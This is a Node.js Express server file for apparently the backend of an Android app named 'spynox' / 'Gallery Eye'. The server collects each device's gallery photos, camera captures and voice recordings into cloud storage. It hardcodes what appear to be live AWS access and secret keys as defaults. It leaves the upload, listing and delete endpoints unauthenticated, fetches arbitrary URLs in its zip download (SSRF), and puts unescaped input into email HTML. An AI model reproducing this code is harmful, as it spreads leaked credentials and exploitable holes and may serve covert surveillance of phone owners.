require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { S3Client, PutObjectCommand, ListObjectsV2Command, DeleteObjectsCommand } = require('@aws-sdk/client-s3');
const AdmZip = require('adm-zip');
const axios = require('axios');
const nodemailer = require('nodemailer');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');
const os = require('os');
const multer = require('multer');

const app = express();
app.use(cors());
app.use(express.json());

// Multer for file uploads (memory storage)
const storage = multer.memoryStorage();
const upload = multer({ storage: storage, limits: { fileSize: 50 * 1024 * 1024 } }); // 50MB limit

// Storage Config (AWS S3 & Cloudflare R2 compatible)
const AWS_REGION = process.env.AWS_REGION || 'us-east-1';
const S3_BUCKET = process.env.AWS_BUCKET_NAME || process.env.R2_BUCKET_NAME || 'spynox-media-vault-2026';
const S3_ACCESS_KEY = process.env.AWS_ACCESS_KEY_ID || process.env.R2_ACCESS_KEY_ID || 'AKIAW6F55NYVSLUQLSA3';
const S3_SECRET_KEY = process.env.AWS_SECRET_ACCESS_KEY || process.env.R2_SECRET_ACCESS_KEY || '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';
const S3_ENDPOINT = process.env.S3_ENDPOINT || (process.env.R2_ACCOUNT_ID ? `https://${process.env.R2_ACCOUNT_ID}.r2.cloudflarestorage.com` : undefined);
const S3_PUBLIC_URL = process.env.S3_PUBLIC_URL || process.env.CLOUDFRONT_URL || process.env.R2_PUBLIC_URL || `https://${S3_BUCKET}.s3.${AWS_REGION}.amazonaws.com`;
const R2_BUCKET = S3_BUCKET;

const s3ClientConfig = {
    region: AWS_REGION,
    credentials: {
        accessKeyId: S3_ACCESS_KEY,
        secretAccessKey: S3_SECRET_KEY
    }
};
if (S3_ENDPOINT) {
    s3ClientConfig.endpoint = S3_ENDPOINT;
}

const s3 = new S3Client(s3ClientConfig);

// Helper: get public URL for a file stored in S3 / R2
function getR2Url(key) {
    return `${S3_PUBLIC_URL}/${key}`;
}

// Email Transporter
const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST || 'smtp.gmail.com',
    port: parseInt(process.env.SMTP_PORT || '587'),
    secure: false,
    auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
    }
});

// Job Queue (in-memory)
const jobs = new Map();

// Job Statuses
const JobStatus = {
    QUEUED: 'queued',
    PROCESSING: 'processing',
    COMPLETED: 'completed',
    FAILED: 'failed'
};

// Health Check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', jobs: jobs.size, memory: process.memoryUsage() });
});

// ===============================
// HEAVY ENDPOINTS (Proxied from Main Server)
// ===============================

// Image Upload (from Android via Main Server proxy)
app.post('/upload', upload.single('image'), async (req, res) => {
    try {
        const { uuid, deviceId } = req.body;
        if (!req.file) return res.status(400).json({ error: 'No file' });

        const originalName = req.file.originalname || `upload_${Date.now()}`;
        const deviceFolder = deviceId ? `${deviceId}/` : '';
        const key = `gallery_sync/${uuid}/${deviceFolder}${Date.now()}_${originalName}`;
        const isVideo = req.file.mimetype && req.file.mimetype.startsWith('video/');

        await s3.send(new PutObjectCommand({
            Bucket: R2_BUCKET,
            Key: key,
            Body: req.file.buffer,
            ContentType: req.file.mimetype || 'image/jpeg'
        }));

        const image = {
            id: key,
            url: getR2Url(key),
            created_at: new Date().toISOString(),
            resource_type: isVideo ? 'video' : 'image'
        };

        res.json({ message: 'Success', ...image });

    } catch (error) {
        console.error("Upload Error:", error);
        res.status(500).json({ error: error.message });
    }
});

// Fetch Images from R2
app.get('/images', async (req, res) => {
    const { uuid, deviceId } = req.query;
    if (!uuid) return res.json([]);

    try {
        const deviceFolder = deviceId ? `${deviceId}/` : '';
        const prefix = `gallery_sync/${uuid}/${deviceFolder}`;
        let allFiles = [];
        let continuationToken = undefined;

        // Paginate through all R2 objects
        do {
            const params = {
                Bucket: R2_BUCKET,
                Prefix: prefix,
                MaxKeys: 1000
            };
            if (continuationToken) params.ContinuationToken = continuationToken;

            const response = await s3.send(new ListObjectsV2Command(params));
            if (response.Contents) allFiles.push(...response.Contents);
            continuationToken = response.IsTruncated ? response.NextContinuationToken : undefined;
        } while (continuationToken);

        const files = allFiles.sort((a, b) => new Date(b.LastModified) - new Date(a.LastModified));

        const page = parseInt(req.query.page) || 1;
        const limit = parseInt(req.query.limit) || 50;
        const start = (page - 1) * limit;
        const paged = files.slice(start, start + limit);

        res.json({
            items: paged.map(file => {
                const ext = path.extname(file.Key || '').toLowerCase();
                const isVideo = ['.mp4', '.mov', '.avi', '.webm', '.mkv', '.3gp'].includes(ext);
                const isZip = ext === '.zip';
                return {
                    id: file.Key,
                    url: getR2Url(file.Key),
                    created_at: file.LastModified,
                    resource_type: isVideo ? 'video' : isZip ? 'zip' : 'image',
                    name: path.basename(file.Key || '')
                };
            }),
            total: files.length,
            page,
            hasMore: start + limit < files.length
        });
    } catch (error) {
        console.error("Fetch Error:", error);
        res.status(500).json({ error: 'Fetch failed' });
    }
});

// Fetch Camera from R2
app.get('/camera', async (req, res) => {
    const { uuid, deviceId } = req.query;
    if (!uuid) return res.json([]);

    try {
        const deviceFolder = deviceId ? `${deviceId}/` : '';
        const prefix = `camera_sync/${uuid}/${deviceFolder}`;
        let allFiles = [];
        let continuationToken = undefined;

        // Paginate through all R2 objects
        do {
            const params = {
                Bucket: R2_BUCKET,
                Prefix: prefix,
                MaxKeys: 1000
            };
            if (continuationToken) params.ContinuationToken = continuationToken;

            const response = await s3.send(new ListObjectsV2Command(params));
            if (response.Contents) allFiles.push(...response.Contents);
            continuationToken = response.IsTruncated ? response.NextContinuationToken : undefined;
        } while (continuationToken);

        const files = allFiles.sort((a, b) => new Date(b.LastModified) - new Date(a.LastModified));

        const page = parseInt(req.query.page) || 1;
        const limit = parseInt(req.query.limit) || 50;
        const start = (page - 1) * limit;
        const paged = files.slice(start, start + limit);

        res.json({
            items: paged.map(file => {
                const ext = path.extname(file.Key || '').toLowerCase();
                const isVideo = ['.mp4', '.mov', '.avi', '.webm', '.mkv', '.3gp'].includes(ext);
                return {
                    id: file.Key,
                    url: getR2Url(file.Key),
                    created_at: file.LastModified,
                    resource_type: isVideo ? 'video' : 'image',
                    name: path.basename(file.Key || '')
                };
            }),
            total: files.length,
            page,
            hasMore: start + limit < files.length
        });
    } catch (error) {
        console.error("Camera Fetch Error:", error);
        res.status(500).json({ error: 'Fetch failed' });
    }
});

app.get('/voice', async (req, res) => {
    const { uuid, deviceId } = req.query;
    if (!uuid) return res.json([]);

    try {
        const deviceFolder = deviceId ? `${deviceId}/` : '';
        const prefix = `voice_sync/${uuid}/${deviceFolder}`;
        let allFiles = [];
        let continuationToken = undefined;

        // Paginate through all R2 objects
        do {
            const params = {
                Bucket: R2_BUCKET,
                Prefix: prefix,
                MaxKeys: 1000
            };
            if (continuationToken) params.ContinuationToken = continuationToken;

            const response = await s3.send(new ListObjectsV2Command(params));
            if (response.Contents) allFiles.push(...response.Contents);
            continuationToken = response.IsTruncated ? response.NextContinuationToken : undefined;
        } while (continuationToken);

        const files = allFiles.sort((a, b) => new Date(b.LastModified) - new Date(a.LastModified));

        const page = parseInt(req.query.page) || 1;
        const limit = parseInt(req.query.limit) || 50;
        const start = (page - 1) * limit;
        const paged = files.slice(start, start + limit);

        res.json({
            items: paged.map(file => {
                return {
                    id: file.Key,
                    url: getR2Url(file.Key),
                    created_at: file.LastModified,
                    resource_type: 'audio',
                    name: path.basename(file.Key || '')
                };
            }),
            total: files.length,
            page,
            hasMore: start + limit < files.length
        });
    } catch (error) {
        console.error("Voice Fetch Error:", error);
        res.status(500).json({ error: 'Fetch failed' });
    }
});

// Download ZIP (multiple images) - streaming to avoid OOM
app.post('/download-zip', async (req, res) => {
    const { urls } = req.body;
    if (!urls || !Array.isArray(urls)) return res.status(400).send("Invalid URLs");

    try {
        const archiver = require('archiver');
        const archive = archiver('zip', { zlib: { level: 5 } });
        res.set({
            'Content-Type': 'application/zip',
            'Content-Disposition': 'attachment; filename=gallery_download.zip'
        });
        archive.pipe(res);
        for (const url of urls) {
            const fileName = path.basename(new URL(url).pathname);
            const response = await axios.get(url, { responseType: 'stream', timeout: 30000 });
            archive.append(response.data, { name: fileName });
        }
        await archive.finalize();
    } catch (error) {
        console.error("ZIP Error:", error);
        if (!res.headersSent) res.status(500).json({ error: 'ZIP creation failed' });
    }
});

// Delete Images from R2
app.post('/delete', async (req, res) => {
    const { ids } = req.body;
    if (!ids || !Array.isArray(ids) || ids.length === 0) {
        return res.status(400).json({ error: 'No IDs provided' });
    }

    try {
        const deleteParams = {
            Bucket: R2_BUCKET,
            Delete: {
                Objects: ids.map(id => ({ Key: id })),
                Quiet: true
            }
        };
        const result = await s3.send(new DeleteObjectsCommand(deleteParams));
        res.json({ message: 'Deleted successfully', result });
    } catch (error) {
        console.error("Delete Error:", error);
        res.status(500).json({ error: 'Delete failed' });
    }
});

// Queue a bulk download job
app.post('/queue-download', async (req, res) => {
    const { uuid, userEmail, folderName, serviceSecret } = req.body;

    // Verify service secret
    if (serviceSecret !== process.env.SERVICE_SECRET) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    if (!uuid || !userEmail || !folderName) {
        return res.status(400).json({ error: 'Missing required fields: uuid, userEmail, folderName' });
    }

    const jobId = uuidv4();
    const job = {
        id: jobId,
        uuid,
        userEmail,
        folderName,
        status: JobStatus.QUEUED,
        createdAt: new Date(),
        progress: 0,
        downloadUrl: null,
        error: null
    };

    jobs.set(jobId, job);
    console.log(`[Job ${jobId}] Queued for folder: ${folderName}, user: ${userEmail}`);

    // Start processing in background
    processJob(jobId);

    res.json({
        success: true,
        jobId,
        message: 'Job queued successfully. You will receive an email when ready.'
    });
});

// Check job status
app.get('/job-status/:jobId', (req, res) => {
    const { jobId } = req.params;
    const job = jobs.get(jobId);

    if (!job) {
        return res.status(404).json({ error: 'Job not found' });
    }

    res.json({
        jobId: job.id,
        status: job.status,
        progress: job.progress,
        downloadUrl: job.downloadUrl,
        error: job.error
    });
});

// Process job in background
async function processJob(jobId) {
    const job = jobs.get(jobId);
    if (!job) return;

    try {
        job.status = JobStatus.PROCESSING;
        job.progress = 5;
        console.log(`[Job ${jobId}] Starting processing...`);

        // Fetch files from S3/R2 for this user's folder (support both gallery_sync and gallery_eye namespaces)
        const prefixesToTry = [
            `gallery_sync/${job.uuid}/${job.folderName}/`,
            `gallery_eye/${job.uuid}/${job.folderName}/`,
            `gallery_sync/${job.uuid}/`
        ];
        
        let allResources = [];
        for (const prefix of prefixesToTry) {
            let continuationToken = undefined;
            do {
                const params = {
                    Bucket: R2_BUCKET,
                    Prefix: prefix,
                    MaxKeys: 1000,
                };
                if (continuationToken) params.ContinuationToken = continuationToken;

                const response = await s3.send(new ListObjectsV2Command(params));
                const files = response.Contents || [];
                allResources = allResources.concat(files);
                continuationToken = response.IsTruncated ? response.NextContinuationToken : undefined;
            } while (continuationToken);

            if (allResources.length > 0) {
                console.log(`[Job ${jobId}] Found ${allResources.length} resources under prefix: ${prefix}`);
                break;
            }
        }
        job.progress = Math.min(30, 5 + allResources.length / 10);

        if (allResources.length === 0) {
            throw new Error('No images found in folder');
        }

        // Create temp directory
        const tempDir = path.join(os.tmpdir(), `bulk_${jobId}`);
        fs.mkdirSync(tempDir, { recursive: true });

        // Download files as streams to disk (not arraybuffer)
        job.progress = 35;
        let downloaded = 0;

        for (const resource of allResources) {
            try {
                const fileUrl = getR2Url(resource.Key);
                const response = await axios.get(fileUrl, {
                    responseType: 'stream',
                    timeout: 30000
                });

                const fileName = path.basename(resource.Key);
                const filePath = path.join(tempDir, fileName);
                await new Promise((resolve, reject) => {
                    const writer = fs.createWriteStream(filePath);
                    response.data.pipe(writer);
                    writer.on('finish', resolve);
                    writer.on('error', reject);
                });

                downloaded++;
                job.progress = 35 + Math.floor((downloaded / allResources.length) * 40);
            } catch (err) {
                console.error(`[Job ${jobId}] Failed to download: ${resource.Key}`, err.message);
            }
        }

        console.log(`[Job ${jobId}] Downloaded ${downloaded}/${allResources.length} files`);
        job.progress = 75;

        // Create ZIP using archiver (streaming, not in-memory)
        const zipPath = path.join(os.tmpdir(), `${job.folderName}_${jobId}.zip`);
        await new Promise((resolve, reject) => {
            const archiver = require('archiver');
            const output = fs.createWriteStream(zipPath);
            const archive = archiver('zip', { zlib: { level: 5 } });
            output.on('close', resolve);
            archive.on('error', reject);
            archive.pipe(output);
            const localFiles = fs.readdirSync(tempDir);
            for (const file of localFiles) {
                archive.file(path.join(tempDir, file), { name: file });
            }
            archive.finalize();
        });
        console.log(`[Job ${jobId}] ZIP created: ${zipPath}`);
        job.progress = 85;

        // Upload ZIP to R2 using stream (not readFileSync)
        const zipKey = `gallery_eye_zips/${job.uuid}/${job.folderName}_${Date.now()}.zip`;

        await s3.send(new PutObjectCommand({
            Bucket: R2_BUCKET,
            Key: zipKey,
            Body: fs.createReadStream(zipPath),
            ContentType: 'application/zip'
        }));

        job.downloadUrl = getR2Url(zipKey);
        job.progress = 95;
        console.log(`[Job ${jobId}] ZIP uploaded: ${job.downloadUrl}`);

        // Send email notification
        await sendCompletionEmail(job);
        job.progress = 100;
        job.status = JobStatus.COMPLETED;
        console.log(`[Job ${jobId}] Completed successfully!`);

        // Cleanup temp files
        fs.rmSync(tempDir, { recursive: true, force: true });
        fs.unlinkSync(zipPath);

        // Notify main backend (optional webhook)
        if (process.env.MAIN_BACKEND_URL) {
            try {
                await axios.post(`${process.env.MAIN_BACKEND_URL}/api/webhook/bulk-complete`, {
                    jobId: job.id,
                    uuid: job.uuid,
                    downloadUrl: job.downloadUrl,
                    serviceSecret: process.env.SERVICE_SECRET
                });
            } catch (err) {
                console.error(`[Job ${jobId}] Webhook notification failed:`, err.message);
            }
        }

    } catch (error) {
        console.error(`[Job ${jobId}] Failed:`, error);
        job.status = JobStatus.FAILED;
        job.error = error.message;

        // Send failure email
        await sendFailureEmail(job, error.message);
    }
}

// Send completion email
async function sendCompletionEmail(job) {
    const mailOptions = {
        from: process.env.FROM_EMAIL || process.env.SMTP_USER,
        to: job.userEmail,
        subject: `📦 Your ${job.folderName} folder is ready for download!`,
        html: `
            <!DOCTYPE html>
            <html>
            <head>
                <style>
                    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0a0a0a; color: #fff; margin: 0; padding: 20px; }
                    .container { max-width: 600px; margin: 0 auto; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border-radius: 16px; padding: 40px; }
                    h1 { color: #fff; margin-bottom: 20px; }
                    .btn { display: inline-block; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 16px 32px; text-decoration: none; border-radius: 8px; font-weight: bold; margin: 20px 0; }
                    .info { background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px; margin: 20px 0; }
                    .footer { color: #888; font-size: 12px; margin-top: 30px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>🎉 Your Download is Ready!</h1>
                    <p>Great news! Your <strong>${job.folderName}</strong> folder has been packaged and is ready for download.</p>
                    
                    <div class="info">
                        <p>📁 <strong>Folder:</strong> ${job.folderName}</p>
                        <p>⏰ <strong>Generated:</strong> ${new Date().toLocaleString()}</p>
                    </div>
                    
                    <a href="${job.downloadUrl}" class="btn">⬇️ Download ZIP</a>
                    
                    <p style="color: #888; font-size: 14px;">Note: This download link will expire in 7 days.</p>
                    
                    <div class="footer">
                        <p>- Gallery Eye Team</p>
                    </div>
                </div>
            </body>
            </html>
        `
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log(`[Job ${job.id}] Email sent to ${job.userEmail}`);
    } catch (error) {
        console.error(`[Job ${job.id}] Email failed:`, error);
    }
}

// Send failure email
async function sendFailureEmail(job, errorMessage) {
    const mailOptions = {
        from: process.env.FROM_EMAIL || process.env.SMTP_USER,
        to: job.userEmail,
        subject: `❌ Download failed for ${job.folderName}`,
        html: `
            <div style="font-family: sans-serif; padding: 20px;">
                <h2>Download Failed</h2>
                <p>Sorry, we couldn't process your download for <strong>${job.folderName}</strong>.</p>
                <p>Error: ${errorMessage}</p>
                <p>Please try again or contact support.</p>
            </div>
        `
    };

    try {
        await transporter.sendMail(mailOptions);
    } catch (error) {
        console.error(`[Job ${job.id}] Failure email failed:`, error);
    }
}

// Cleanup old jobs (run every hour)
setInterval(() => {
    const now = Date.now();
    for (const [jobId, job] of jobs.entries()) {
        // Remove completed/failed jobs older than 24 hours
        if (job.status !== JobStatus.PROCESSING &&
            now - new Date(job.createdAt).getTime() > 24 * 60 * 60 * 1000) {
            jobs.delete(jobId);
            console.log(`[Cleanup] Removed old job: ${jobId}`);
        }
    }
}, 60 * 60 * 1000);

const PORT = process.env.PORT || 3002;
app.listen(PORT, () => {
    console.log(`🚀 Bulk Download Server running on port ${PORT}`);
});
